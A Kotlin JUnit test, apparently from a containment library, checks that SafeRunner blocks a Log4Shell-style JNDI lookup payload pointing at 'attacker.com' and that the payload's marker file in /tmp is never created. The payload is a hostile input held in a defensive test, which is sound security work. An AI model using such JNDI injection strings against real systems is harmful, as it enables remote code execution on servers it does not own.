package demo

import io.contained.enforcer.ContainmentViolationException
import org.junit.jupiter.api.Test
import java.io.File
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertTrue

class ProtectionDemonstrationTest {
    @Test
    fun `demonstrates protection`() {
        val osName = System.getProperty("os.name")
        if (!osName.equals("Linux", ignoreCase = true)) return
        if (!io.contained.Platform.isSupported()) return

        val marker = File("/tmp/pwned_safe")
        marker.delete()

        val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"

        val ex = assertFailsWith<ContainmentViolationException> {
            SafeRunner.run(payload)
        }

        assertTrue(ex.message!!.contains("containment", ignoreCase = true),
            "Expected containment violation message, got: ${ex.message}")

        assertFalse(marker.exists(), "Exploit marker should NOT exist")
    }
}
